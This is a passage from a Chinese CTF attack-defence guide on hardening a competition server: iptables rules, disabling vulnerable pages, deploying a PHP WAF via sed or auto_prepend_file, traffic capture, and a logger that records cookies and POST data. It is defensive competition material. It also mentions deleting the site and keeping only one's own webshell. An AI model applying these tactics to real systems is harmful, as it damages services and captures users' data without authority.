&quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;color: rgb(85, 85, 85);background: rgb(238, 238, 238);border-radius: 3px;">-m limit</code>：启用limit扩展<br  /><code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;color: rgb(85, 85, 85);background: rgb(238, 238, 238);border-radius: 3px;">–limit 20/minute</code>：允许最多每分钟10个连接<br  /><code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;color: rgb(85, 85, 85);background: rgb(238, 238, 238);border-radius: 3px;">–limit-burst 100</code>：当达到100个连接后，才启用上述20/minute限制</p></blockquote><p style="margin-bottom: 25px;">丢弃陌生的TCP响应包,防止反弹式攻击</p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t" mpa-from-tpl="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default">iptables -A INPUT -m state <span class="hljs-default-comment" style="color: rgb(92, 99, 112);background: rgba(0, 0, 0, 0);display: inline;width: 224px;text-decoration: none solid rgb(92, 99, 112);font-weight: 400;font-style: italic;">--state NEW -p tcp ! --syn -j DROP</span><br mpa-from-tpl="t"  />iptables -A FORWARD -m state <span class="hljs-default-comment" style="color: rgb(92, 99, 112);background: rgba(0, 0, 0, 0);display: inline;width: 211px;text-decoration: none solid rgb(92, 99, 112);font-weight: 400;font-style: italic;">--state NEW -p tcp --syn -j DROP</span></code></pre></section><ul style="" class=" list-paddingleft-2"><li><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;">提供一个通用的firewall脚本firewall.sh，我们可以传到服务器上一键执行，相关参数可以查阅资料详细了解。</span></p><blockquote style="margin-top: 0px;margin-bottom: 0px;padding-top: 0px;padding-right: 15px;padding-left: 15px;color: rgb(102, 102, 102);border-left-width: 4px;border-left-color: rgb(221, 221, 221);"><p style="margin-bottom: 25px;">注意，对于不同的<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;color: rgb(85, 85, 85);background: rgb(238, 238, 238);border-radius: 3px;">iptables</code>版本，一些参数的用法可以会有略微的差异，使用时我们可能要根据需要进行修改。</p></blockquote></li></ul><h5 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">修复漏洞</h5><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">CTF比赛中修复漏洞主要就是为了防止其他队伍的入侵了。</p><ul style="" class=" list-paddingleft-2"><li><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">删站（不建议）</span></p><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">如果赛组没有明确禁止，这是最粗暴的姿势，只留自己的webshell。</span></p></li><li><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">删页面</span></p><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">大部分举办方还是会明确禁止删除网站的，通常赛组会定期访问网站主页（一般来说），从而确定网站是否正常运行。其实我们没必要删除整个网站，只要删掉有漏洞的页面就行了，比如删后台登录页面、注册页面、上传页面等等。</span></p></li><li><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">破坏正常功能</span></p><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">如果明确不能删除任何页面，可以选择让这些漏洞点的功能函数（或者其依赖的功能函数）失效。比如上传点，如果考虑过滤挺麻烦，又不能删页面，那么我们可以找到这个漏洞网页，改掉或者删掉文件里对应的类似</span><code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">upload</span></code><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">等这种功能调用函数。</span></p></li><li><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">正常修补手段</span></p><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">规则限定很严的情况下，我们还是采用正常手法吧，修改服务配置、安装补丁、下载更新的软件版本、加过滤等等。</span></p><blockquote style="margin-top: 0px;margin-bottom: 0px;padding-top: 0px;padding-right: 15px;padding-left: 15px;color: rgb(102, 102, 102);border-left-width: 4px;border-left-color: rgb(221, 221, 221);"><p style="margin-bottom: 25px;">第1~3种方法其实都算不上修补漏洞了，真实环境下哪能这么干。</p></blockquote></li></ul><h5 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">上WAF</h5><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">可以使用第三方软件的话，装个安全狗之类的吧。</p><blockquote style="margin-top: 0px;margin-bottom: 0px;padding-top: 0px;padding-right: 15px;padding-left: 15px;color: rgb(102, 102, 102);border-left-width: 4px;border-left-color: rgb(221, 221, 221);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);"><p style="margin-bottom: 25px;">下载链接：http://www.safedog.cn/website_safedog.html</p></blockquote><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">也可以搜集或者自己实现一些脚本或者工具备用。</p><blockquote style="margin-top: 0px;margin-bottom: 0px;padding-top: 0px;padding-right: 15px;padding-left: 15px;color: rgb(102, 102, 102);border-left-width: 4px;border-left-color: rgb(221, 221, 221);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);"><p style="margin-bottom: 25px;">本人收集的一些WAF：https://github.com/edwardchoijc/ctf-toolkit/tree/master/Linux/WAF</p></blockquote><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">使用方法：</p><ol style="" class=" list-paddingleft-2"><li><p style="margin-bottom: 25px;">将waf.php传到要包含的文件的目录</p></li><li><p style="margin-bottom: 25px;">在页面中加入防护，有两种做法，根据情况二选一：</p></li><ul class=" list-paddingleft-2" style=""><li><p>PHPCMS V9：<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;color: rgb(85, 85, 85);background: rgb(238, 238, 238);border-radius: 3px;">\phpcms\base.php</code></p></li><li><p>PHPWIND8.7：<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;color: rgb(85, 85, 85);background: rgb(238, 238, 238);border-radius: 3px;">\data\sql_config.php</code></p></li><li><p>DEDECMS5.7：<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;color: rgb(85, 85, 85);background: rgb(238, 238, 238);border-radius: 3px;">\data\common.inc.php</code></p></li><li><p>DiscuzX2：<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;color: rgb(85, 85, 85);background: rgb(238, 238, 238);border-radius: 3px;">\config\config_global.php</code></p></li><li><p>Wordpress：<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;color: rgb(85, 85, 85);background: rgb(238, 238, 238);border-radius: 3px;">\wp-config.php</code></p></li><li><p>Metinfo：<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;color: rgb(85, 85, 85);background: rgb(238, 238, 238);border-radius: 3px;">\include\head.php</code></p></li></ul><ul class=" list-paddingleft-2" style=""><li><p style="margin-bottom: 25px;">在所需要防护的页面加入代码：</p></li></ul><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t" mpa-from-tpl="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 79px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">require_once</span>(<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 59px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'waf.php'</span>);</code></pre></section><ul class=" list-paddingleft-2" style=""><li><p style="margin-bottom: 25px;">这样就可以做到页面防注入、跨站。</p><p style="margin-bottom: 25px;">如果想整站防注，就在网站的一个公用文件中添加上述代码来调用WAF</p><blockquote style="margin-top: 0px;margin-bottom: 0px;padding-top: 0px;padding-right: 15px;padding-left: 15px;color: rgb(102, 102, 102);border-left-width: 4px;border-left-color: rgb(221, 221, 221);"><p style="margin-bottom: 25px;">常用的php的WAF添加路径：</p></blockquote></li></ul></ol><ul style="" class=" list-paddingleft-2"><li><p style="margin-bottom: 25px;">在每个文件最前加上上述代码</p><p style="margin-bottom: 25px;">在<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;">php.ini</code>中找到并添加：</p></li></ul><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t" mpa-from-tpl="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default">Automatically add files before <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 14px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">or</span> after any PHP <span class="hljs-default-built_in" style="color: rgb(230, 192, 123);background: rgba(0, 0, 0, 0);display: inline;width: 53px;text-decoration: none solid rgb(230, 192, 123);font-weight: 400;font-style: normal;">document</span>.<br mpa-from-tpl="t"  />auto_prepend_file = waf.php的路径;</code></pre></section><ul style="" class=" list-paddingleft-2"><li><p style="margin-bottom: 25px;"><span style="background-color: rgb(255, 255, 255);color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;">还有最简便的方法，可以用一条命令解决，以php为例：</span></p></li></ul><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t" mpa-from-tpl="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default">sudo <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">find</span> /var/www/html/path_you_want -<span class="hljs-default-built_in" style="color: rgb(230, 192, 123);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(230, 192, 123);font-weight: 400;font-style: normal;">type</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 7px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">f</span> -path <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 46px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"*.php"</span> | xargs sed -i <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 343px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"s/&lt;?php/&lt;?php\nrequire_once('\/tmp\/waf.php');\n/g"</span><br mpa-from-tpl="t"  />#意思就是查找需要加waf的目录下所有php文件，在头部添加一句，用require_once函数引入/tmp/waf.php文件。因为sed命令利用 / 区分文件中的原字符串和修改的字符串，所以我们要对 / 进行转义。类似于在单引号中再次使用单引号时我们也要用反斜杠转义。</code></pre></section><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">最后，提醒：需要注意的是，部署waf可能会导致服务不可用，部署后要密切留意自己服务器的状态。</p><h5 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">流量和日志分析</h5><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">通过对流量、日志的分析，可以：</p><ol style="" class=" list-paddingleft-2"><li><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">感知可能正在发生的攻击，从而规避存在的安全风险</span></p></li><li><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失</span></p></li><li><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">某些情况下还能对攻击进行重放复现</span></p><p style="margin-bottom: 25px;"><br  /></p></li></ol><ul style="" class=" list-paddingleft-2"><li><p style="margin-bottom: 25px;">流量分析</p><p style="margin-bottom: 25px;">在比赛机器上使用下述命令进行流量抓取：</p></li></ul><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t" mpa-from-tpl="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 46px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">tcpdump</span> <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">-s</span> 0 <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">-w</span> <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 53px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">flow_log</span><span class="hljs-default-selector-class" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">.pcap</span> <span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">port</span> 9999</code></pre></section><ul style="" class=" list-paddingleft-2"><li><p style="margin-bottom: 25px;">然后在本地对抓取的pcap使用wireshark进行分析</p></li><li><p style="margin-bottom: 25px;">日志分析</p><p style="margin-bottom: 25px;">记录log的脚本网上有很多，大家可以自行搜索。例如：</p></li></ul><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t" mpa-from-tpl="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default">&lt;?php<br mpa-from-tpl="t"  />date_default_timezone_set('Asia/Shanghai');<br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">$</span><span class="bash">ip = <span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 53px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$_SERVER</span>[<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 86px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"REMOTE_ADDR"</span>];//记录访问者的ip</span><br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">$</span><span class="bash">filename = <span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 53px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$_SERVER</span>[<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 66px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'PHP_SELF'</span>];//访问者要访问的文件名</span><br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">$</span><span class="bash">parameter = <span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 52px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$_SERVER</span>[<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 92px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"QUERY_STRING"</span>];//访问者要请求的参数</span><br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">$</span><span class="bash">method = <span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 53px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$_SERVER</span>[<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 106px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'REQUEST_METHOD'</span>];//请求方法</span><br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">$</span><span class="bash">time = date(<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 85px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'Y-m-d H:i:s'</span>,time());//访问时间</span><br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">$</span><span class="bash">post = file_get_contents(<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 86px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"php://input"</span>,<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 19px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'r'</span>);//接收POST数据</span><br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">$</span><span class="bash">others = <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 160px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'...其他你想得到的信息...'</span>;</span><br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">$</span><span class="bash">logadd = <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 73px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'访问时间：'</span>.<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$time</span>.<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'--&gt;'</span>.<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 119px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'访问链接：http://'</span>.<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 19px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$ip</span>.<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 59px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$filename</span>.<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 20px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'?'</span>.<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 66px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$parameter</span>.<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 73px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'请求方法：'</span>.<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 46px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$method</span>.<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"\r\n"</span>;</span><br mpa-from-tpl="t"  />// log记录<br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">$</span><span class="bash">fh = fopen(<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 59px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"log.txt"</span>, <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 19px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"a"</span>);</span><br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 53px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">fwrite($</span><span class="bash">fh, <span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 46px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$logadd</span>);</span><br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 53px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">fwrite($</span><span class="bash">fh,print_r(<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 53px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$_COOKIE</span>, <span class="hljs-default-literal" style="color: rgb(86, 182, 194);background: rgba(0, 0, 0, 0);display: inline;width: 27px;text-decoration: none solid rgb(86, 182, 194);font-weight: 400;font-style: normal;">true</span>).<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"\r\n"</span>);</span><br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 53px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">fwrite($</span><span class="bash">fh,<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 47px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$others</span>.<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 40px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"\r\n"</span>);</span><br mpa-from-tpl="t"  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 53px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">fclose($</span><span class="bash">fh);</span><br mpa-from-tpl="t"  />?&gt;</code></pre></section><ul style="" class=" list-paddingleft-2"><li><p style="margin-bottom: 25px;">日志分析工具有：</p></li><ul class=" list-paddingleft-2" style="list-style-type: square;"><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">LogForensics@腾讯实验室</span></p></li><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">北风飘然@金乌网络安全实验室</span></p></li><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">piaox的多线程WEB安全日志分析脚本</span></p></li><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">SecSky的Web日志安全分析工具</span></p></li><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">鬼魅羊羔的Web日志分析脚本</span></p></li></ul></ul><h5 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">假flag</h5><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">如果说很不幸，我们前面的关卡都被突破了（实际上我都感觉前面那些设置都有点“搅屎”的味道了，不过还是希望师傅们能一起来讨论讨论有没有什么骚姿势，以及绕过它们的方法）。假设真的被突破了，对于CTF线下赛来说，我们最终的目的都是拿到flag。通常我们会在服务器上执行类似于<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, 